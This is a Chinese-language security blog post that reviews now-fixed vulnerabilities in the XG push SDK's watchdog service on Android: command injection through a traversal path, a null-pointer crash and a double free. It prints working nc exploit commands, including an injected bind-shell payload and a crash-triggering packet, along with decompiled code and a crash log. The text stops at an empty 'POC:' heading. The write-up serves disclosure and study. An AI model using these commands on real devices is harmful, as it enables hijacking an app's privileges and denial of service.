<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>一个目录穿越引发的注入及后续——XG SDK漏洞回顾与思考 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">一个目录穿越引发的注入及后续——XG SDK漏洞回顾与思考</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">一个目录穿越引发的注入及后续——XG SDK漏洞回顾与思考</h1><div class="post-meta">2016-12-01<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 5.2k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 26</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x02  漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞是否能够远程"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞是否能够远程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-空指针解引用远程拒绝服务"><span class="toc-number">5.</span> <span class="toc-text">0x04 空指针解引用远程拒绝服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-double-free内存破坏"><span class="toc-number">6.</span> <span class="toc-text">0x05 double free内存破坏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-后续"><span class="toc-number">7.</span> <span class="toc-text">0x06 后续</span></a></li></ol></div></div><div class="post-content"><p>作者：小荷才露尖尖角</p>
<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。</p>
<p>漏洞最初在2016年4月份的时候提交给了某云网站，厂商已经确认，但由于网站持续“升级”的缘故，不太可能公开细节了。后续漏洞也已经提交给了TSRC，时至现在，相关漏洞均已经完全修复，漏洞已经不影响使用该SDK的app了，因此本文决定对相关技术细节予以分享，并补充有关该漏洞后续的一些研究。<a id="more"></a></p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>XG SDK会周期性地启动一个libtpnsWatchdog.so的可执行文件，作为看门狗保活应用，并随机在55000~56000端口监听任意地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static int getRandomPort() &#123;</span><br><span class="line">        return XGWatchdog.getRandomInt(1000) + 55000;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在我们实验手机上的监听端口为55362，启动进程为com.tencent.wework lib目录下的libtpnsWatchdog.so</p>
<p><img src="/2016/12/01/xg_sdk_lpe/port.png" alt="port"></p>
<p>经过逆向分析，可发现这个开放端口支持一系列的文本命令，包括：</p>
<ul>
<li>“ver:”，获取版本号</li>
<li>“debug:1”，打开调试</li>
<li>“xgapplist:”,获取或设置使用XG sdk的app</li>
<li>“tme:xxxx”，设置周期性启动服务的等待时间</li>
<li>”exit2:”，退出</li>
</ul>
<p>例如，发送debug:1，可获得当前手机上使用XG的app列表及当前启动服务的等待时间等信息，可见，手机上有四个app使用了该推送sdk。<br><code>echo -n “debug:1” |nc 192.168.8.187 55362</code></p>
<p><img src="/2016/12/01/xg_sdk_lpe/list.png" alt="list"></p>
<p>当发送xgapplist:xxx，则可以设置当前使用XG的app。其中xxx的形式为 &lt;packagename1&gt;,&lt;accid1&gt;;&lt;packagename2&gt;,&lt;accid2&gt;…</p>
<p>接下来会通过fopen打开/data/data/&lt;packagename&gt;/lib目录来判断指定packagename的目录是否存在，如果存在，则会在后续使用该packagename，否则提示找不到该package。</p>
<p><img src="/2016/12/01/xg_sdk_lpe/checkdir.png" alt="checkdir"></p>
<p>然后，程序会调用system通过am命令启动对应包内的XG组件，这里就使用了上面检查过的packagename.</p>
<p><img src="/2016/12/01/xg_sdk_lpe/system.png" alt="system"></p>
<p>注意，上述两个system函数中的参数没有进行任何过滤。那么，我们结合上述两张图来看，如果恶意app满足</p>
<ol>
<li><strong>能够设置一个存在且被XG Sdk可以访问的目录，</strong></li>
<li><strong>目录名中嵌入执行的代码</strong></li>
</ol>
<p>那么就可以实现命令注入。对于条件1，可以通过../../../../路径穿越的形式跳转到恶意app可控的目录；而对于条件2，则可以利用shell特性，在可控目录下建立猥琐的“ || &lt;command&gt; #”目录实现。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02  漏洞利用"></a>0x02  漏洞利用</h2><p>（1）模拟恶意app在/sdcard目录建立一个特殊（猥琐）的目录名，除了“/“字符外，其他字符均可用。</p>
<p><img src="/2016/12/01/xg_sdk_lpe/evildir.png" alt="evildir"></p>
<p>于是我们有了了” &amp;&amp; nc -ll -p 6666 -e sh #”的目录，并在目录下存在子目录lib</p>
<p>（2）通过xgapplist命令设置推送app</p>
<p>如图，发送命令，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;xgapplist:com.tencent.wework&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;sdcard&#x2F; &amp;&amp; nc -ll -p 6666 -e sh #,2100078991;&quot; | nc -vv 192.168.8.187 55362</span><br></pre></td></tr></table></figure>
<p>观察logcat可以发现设置成功</p>
<p><img src="/2016/12/01/xg_sdk_lpe/setdirsuccess.png" alt="setdirsuccess"></p>
<p>（3）通过tme命令，使am命令周期性进行，进而触发后面的system函数，执行我们的反弹shell命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n “tme:12345” | nc -v 192.168.8.187 55362</span><br></pre></td></tr></table></figure>

<p>稍等片刻，观察logcat的打印信息后，可以尝试连接shell，成功连接</p>
<p><img src="/2016/12/01/xg_sdk_lpe/nc.png" alt="nc"></p>
<p>u0_a113用户正好就是com.tencent.wework</p>
<p><img src="/2016/12/01/xg_sdk_lpe/workchat.png" alt="workchat"></p>
<p>下面就可以以com.tencent.wework的权限做任何事情了，比如访问私有目录、打开保护的activity、发广播等等。</p>
<h2 id="0x03-漏洞是否能够远程"><a href="#0x03-漏洞是否能够远程" class="headerlink" title="0x03 漏洞是否能够远程"></a>0x03 漏洞是否能够远程</h2><p>因为当时漏洞取名带有“远程”二字不够严谨，引发了厂商的争议。的确，从这个漏洞的成因来看，主要还是本地恶意app通过污染目录名，结合XG开放的端口，完成本地提权。但经瘦蛟舞的指点，可以考虑向受害者发送包含污染目录名的zip包（或者通过浏览器下载解压至/sdcard），然后结合XG监听端口的地址为任意地址，远程传入命令，进而实现远程命令执行，这种远程攻击相对难度较大，因为开放的端口为随机端口，攻击者也需要社工欺骗受害者接收zip包.</p>
<h2 id="0x04-空指针解引用远程拒绝服务"><a href="#0x04-空指针解引用远程拒绝服务" class="headerlink" title="0x04 空指针解引用远程拒绝服务"></a>0x04 空指针解引用远程拒绝服务</h2><p>当向XG监听端口发送xgapplist命令时，libtpnsWatchdog.so对后面的packagename和accid进行处理，但并没有检查“，”或“；“分割的字符串为空的情况，导致后面atoll函数去访问0地址的内存，造成空指针解引用crash。见如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v1 &#x3D; a1;</span><br><span class="line">  if ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    j_j_memset(xgapplist, 0, 0x200u);</span><br><span class="line">    first_app &#x3D; j_j_strtok(v1, &quot;;&quot;);</span><br><span class="line">    v3 &#x3D; 0;</span><br><span class="line">    v2 &#x3D; first_app;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      len_of_applist &#x3D; v3;</span><br><span class="line">      if ( !v2 )</span><br><span class="line">        break;</span><br><span class="line">      v5 &#x3D; j_j_strlen(v2);</span><br><span class="line">      v6 &#x3D; v5 + 1;</span><br><span class="line">      v7 &#x3D; (void *)j_operator new[](v5 + 1);</span><br><span class="line">      xgapplist[len_of_applist] &#x3D; v7;</span><br><span class="line">      j_j_memcpy(v7, v2, v6);</span><br><span class="line">      v2 &#x3D; j_j_strtok(0, &quot;;&quot;);</span><br><span class="line">      v3 &#x3D; len_of_applist + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; len_of_applist; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 &#x3D; (char *)xgapplist[i];</span><br><span class="line">      if ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        package &#x3D; j_j_strtok(v8, &quot;,&quot;);</span><br><span class="line">        accid &#x3D; j_j_strtok(0, &quot;,&quot;);</span><br><span class="line">        v11 &#x3D; accid;</span><br><span class="line">        v12 &#x3D; j_j_atoll(accid); &#x2F;&#x2F;null pointer dereference crash !!!!</span><br><span class="line">        v27 &#x3D; v12;</span><br></pre></td></tr></table></figure>


<p>向55362端口发送一个最简单的数据包，<br><code>echo -n &quot;xgapplist:A&quot; | nc -v 192.168.8.169 55362</code></p>
<p>使用logcat可观察到Oops：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;DEBUG   (  243): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line">I&#x2F;DEBUG   (  243): Build fingerprint: &#39;google&#x2F;hammerhead&#x2F;hammerhead:4.4.4&#x2F;KTU84P&#x2F;1227136:user&#x2F;release-keys&#39;</span><br><span class="line">I&#x2F;DEBUG   (  243): Revision: &#39;11&#39;</span><br><span class="line">I&#x2F;DEBUG   (  243): pid: 11774, tid: 11774, name: xg_watchdog  &gt;&gt;&gt; &#x2F;data&#x2F;data&#x2F;com.tencent.wework&#x2F;lib&#x2F;libtpnsWatchdog.so &lt;&lt;&lt;</span><br><span class="line">I&#x2F;DEBUG   (  243): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     r0 4008a2d8  r1 40083d28  r2 ffffff78  r3 00000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     r4 400165c6  r5 00000002  r6 0000000a  r7 00000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     r8 400120d9  r9 00000000  sl 00000000  fp bed838ec</span><br><span class="line">I&#x2F;DEBUG   (  243):     ip 40018f68  sp bed7f6e8  lr 400125e5  pc 4006aab0  cpsr 000f0030</span><br><span class="line">I&#x2F;DEBUG   (  243):     d0  0000000000000000  d1  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d2  0000000000000000  d3  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d4  0000000000000000  d5  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d6  0000000000000000  d7  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d8  0000000000000000  d9  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d10 0000000000000000  d11 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d12 0000000000000000  d13 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d14 0000000000000000  d15 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d16 41db6820b9bcac08  d17 3f50624dd2f1a9fc</span><br><span class="line">I&#x2F;DEBUG   (  243):     d18 419908a090000000  d19 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d20 0000000000000000  d21 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d22 0000000000000000  d23 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d24 0000000000000000  d25 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d26 0000000000000000  d27 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d28 0000000000000000  d29 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     d30 0000000000000000  d31 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  243):     scr 00000010</span><br><span class="line">I&#x2F;DEBUG   (  243):</span><br><span class="line">I&#x2F;DEBUG   (  243): backtrace:</span><br><span class="line">I&#x2F;DEBUG   (  243):     #00  pc 0002aab0  &#x2F;system&#x2F;lib&#x2F;libc.so (strtoimax+31)</span><br><span class="line">I&#x2F;DEBUG   (  243):     #01  pc 000015e1  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  243):     #02  pc 00002787  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  243):     #03  pc 0000124f  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  243):     #04  pc 0000e34b  &#x2F;system&#x2F;lib&#x2F;libc.so (__libc_init+50)</span><br><span class="line">I&#x2F;DEBUG   (  243):     #05  pc 00001390  &#x2F;data&#x2F;app-lib&#x2F;com.tencent.wework-1&#x2F;libtpnsWatchdog.so</span><br><span class="line">I&#x2F;DEBUG   (  243)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-double-free内存破坏"><a href="#0x05-double-free内存破坏" class="headerlink" title="0x05 double free内存破坏"></a>0x05 double free内存破坏</h2><p>仍然观察xgapplist命令，程序接收socket端口传入的命令xgapplist:&lt;packagename&gt;,&lt;accid&gt;;&lt;packgename2&gt;,&lt;accid2&gt;;…;&lt;packagenamen&gt;,&lt;accidn&gt;; 时，程序会对上述命令进行解析，分配xgappinfo对象，并依次将不重复的xgappinfo（使用XG SDK的app的信息）对象存入全局数组xgappinfo_list</p>
<p>xgappinfo占用16字节，为如下结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct xgappinfo &#123;</span><br><span class="line">    long accid,</span><br><span class="line">    char* packgename,</span><br><span class="line">    int  status</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如图</p>
<p><img src="/2016/12/01/xg_sdk_lpe/xgappinfo.png" alt="xgappinfo"></p>
<p>再来看下下面这段程序逻辑，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_40056574</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+24h] [bp-2Ch]@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [sp+28h] [bp-28h]@8</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  j_j_memset(dword_40060028, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  v2 = j_j_strtok(v1, <span class="string">";"</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = v2;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = j_j_strlen(v4);</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)j_operator <span class="keyword">new</span>[](v5 + <span class="number">1</span>);</span><br><span class="line">    dword_40060028[v25] = v7;</span><br><span class="line">    j_j_memcpy(v7, v4, v6);</span><br><span class="line">    v4 = j_j_strtok(<span class="number">0</span>, <span class="string">";"</span>);</span><br><span class="line">    v3 = v25 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &amp;lt; v25; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)dword_40060028[i];</span><br><span class="line">    <span class="keyword">if</span> ( sub_4005651C(dword_40060028[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = j_j_strtok(v8, <span class="string">","</span>);</span><br><span class="line">      v10 = j_j_strtok(<span class="number">0</span>, <span class="string">","</span>);</span><br><span class="line">      v11 = v10;</span><br><span class="line">      v12 = j_j_atoll(v10);</span><br><span class="line">      v27 = v12;</span><br><span class="line">      <span class="keyword">if</span> ( v12 &amp;lt;= <span class="number">0x3B9AC9FF</span> &amp;amp;&amp;amp; dword_4005D018 )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = HIDWORD(v12);</span><br><span class="line">        j_j___android_log_print(<span class="number">6</span>, <span class="string">"xguardian"</span>, <span class="string">"error accessid:%llu"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &amp;amp;&amp;amp; v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = &amp;amp;dword_4005E028;                  <span class="comment">// xgapp_info结构体存储的起始地址</span></span><br><span class="line">        <span class="keyword">for</span> ( j = &amp;amp;dword_4005E028; ; j = v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = (<span class="keyword">const</span> <span class="keyword">char</span> *)v13[<span class="number">2</span>];</span><br><span class="line">          v15 = v13;</span><br><span class="line">          <span class="keyword">if</span> ( !v14 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !j_j_strcmp(v9, v14) )</span><br><span class="line">          &#123;</span><br><span class="line">            *v13 = v27;</span><br><span class="line">            v13[<span class="number">1</span>] = HIDWORD(v27);</span><br><span class="line">            v16 = <span class="number">1</span>;</span><br><span class="line">            *((_BYTE *)v15 + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">            v15 = j;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)v13 + <span class="number">12</span>) )</span><br><span class="line">            v15 = j;</span><br><span class="line">          v13 += <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v13 == dword_40060028 )</span><br><span class="line">            <span class="keyword">break</span>;                              <span class="comment">// 最多只能存储512个对象，每个对象占用16字节</span></span><br><span class="line">        &#125;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">        <span class="keyword">if</span> ( dword_4005D018 )</span><br><span class="line">          j_j___android_log_print(<span class="number">4</span>, <span class="string">"xguardian"</span>, <span class="string">"found %d, pkgName:%s,accid:%s"</span>, v16, v9, v11);</span><br><span class="line">        <span class="keyword">if</span> ( !v16 &amp;amp;&amp;amp; sub_40055B98(v9) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4005D018 )</span><br><span class="line">            j_j___android_log_print(<span class="number">4</span>, <span class="string">"xguardian"</span>, <span class="string">"try to add to the unstall list"</span>);</span><br><span class="line">          v17 = j_j_strlen(v9) + <span class="number">1</span>;</span><br><span class="line">          v18 = (<span class="keyword">void</span> *)v15[<span class="number">2</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v18 )</span><br><span class="line">          &#123;</span><br><span class="line">j_j__ZdaPv:</span><br><span class="line">            <span class="keyword">operator</span> <span class="keyword">delete</span>[](v18);             </span><br><span class="line">/ *</span><br><span class="line">  * 这段存在问题，v18没有置为null。导致当循环到<span class="number">512</span>个对象的时候，由于前面循环的限制，v18    还是指向第<span class="number">512</span>个对象中在堆上分配的packagename的地址，此时v18会被<span class="keyword">delete</span>。</span><br><span class="line"></span><br><span class="line">当<span class="number">512</span>以上的多个命令数据达到，需要有多个packagename需要添加时，由于并发处理，程序会在返回之前再次运行到此处，v18还是指向同一地址，由于v18已被<span class="keyword">delete</span>，此时会再次<span class="keyword">delete</span>一下，从而导致<span class="keyword">delete</span>出错</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v19 = (<span class="keyword">void</span> *)j_operator <span class="keyword">new</span>[](v17);</span><br><span class="line">          v15[<span class="number">2</span>] = (<span class="keyword">int</span>)v19;</span><br><span class="line">          j_j_memset(v19, <span class="number">0</span>, v17);</span><br><span class="line">          j_j_memcpy((<span class="keyword">void</span> *)v15[<span class="number">2</span>], v9, v17);</span><br><span class="line">          *(_BYTE *)(v15[<span class="number">2</span>] + v17) = <span class="number">0</span>;</span><br><span class="line">          </span><br><span class="line">          v20 = j_j_atoll(v11);</span><br><span class="line">          *((_BYTE *)v15 + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">          *(_QWORD *)v15 = v20;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4005D018 )</span><br><span class="line">            j_j___android_log_print(<span class="number">4</span>, <span class="string">"xguardian"</span>, <span class="string">"add new unInfo pkgName:%s,accid:%llu"</span>, v15[<span class="number">2</span>], v20);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = (<span class="keyword">void</span> *)dword_40060028[i];</span><br><span class="line">    <span class="keyword">if</span> ( v18 )</span><br><span class="line">      <span class="keyword">goto</span> j_j__ZdaPv;</span><br><span class="line">  &#125;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
<p>对通过socket端口传入的xgapplist命令的解析主要包括以下几个步骤：</p>
<ul>
<li>解析分号的分隔，获得每个xg app的信息；</li>
<li>解析逗号的分隔，获得xg app packagename和accid；</li>
<li>从0x4005E028开始，依次存储解析xgappinfo得到的结果，分别为accid、packagename、status，从而构成xgappinfo_list；</li>
<li>当再次传入xgapplist命令时，会将传入的packagename与已存储的packagename比较。如果不同，说明是新的packagename，则会在堆上分配地址存储，并将这个堆上分配的地址添加到xgappinfo_list中。如果相同，不进行添加。</li>
<li>最多只能添加到0x40060028这个地址，到这个地址会跳出循环，也就是最多只能添加(0x40060028-0x4005E028)/16=512个xgappinfo结构体<br>注意下面这段代码</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">          &#123;</span><br><span class="line">j_j__ZdaPv:</span><br><span class="line">            <span class="keyword">operator</span> <span class="keyword">delete</span>[](v18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v18为下一个未分配区域的packagename，XG SDK认为如果不为空，则表明已在堆上分配，因此需要delete。然而测试表明，当添加xgappinfo超过512，为518、519等多个时（注意：并非超过1个），可以触发堆内存破坏。</p>
<p>POC:</p>
